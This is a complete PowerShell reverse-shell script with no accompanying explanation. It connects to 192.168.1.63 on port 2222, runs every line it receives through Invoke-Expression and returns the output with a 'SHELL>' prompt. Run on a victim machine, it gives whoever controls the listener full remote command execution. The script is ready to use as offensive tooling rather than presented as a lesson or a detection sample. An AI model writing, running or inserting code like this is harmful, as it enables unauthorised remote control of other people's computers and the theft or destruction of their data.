

$ErrorActionPreference = "Stop"

function Connect-RemoteShell {
    param (
        [string]$RemoteAddress,
        [int]$RemotePort
    )

    try {
        $tcpClient = New-Object Net.Sockets.TCPClient
        $result = $tcpClient.BeginConnect($RemoteAddress, $RemotePort, $null, $null)
        $wait = $result.AsyncWaitHandle.WaitOne(5000, $false)

        if (!$wait -or !$tcpClient.Connected) {
            throw "Failed to establish a connection."
        }

        $stream = $tcpClient.GetStream()
        $writer = New-Object IO.StreamWriter($stream)
        $reader = New-Object IO.StreamReader($stream)

        while ($true) {
            $commandPrompt = $reader.ReadLine()
            if ($commandPrompt -eq $null) { break }

            $output = Invoke-Expression $commandPrompt 2>&1 | Out-String
            $writer.WriteLine($output + "
SHELL> ")
            $writer.Flush()
        }
    }
    catch {
        Write-Host "Failed to establish a connection: $_"
    }
    finally {
        if ($reader) { $reader.Close() }
        if ($writer) { $writer.Close() }
        if ($tcpClient) { $tcpClient.Close() }
    }
}

Connect-RemoteShell -RemoteAddress 192.168.1.63 -RemotePort 2222
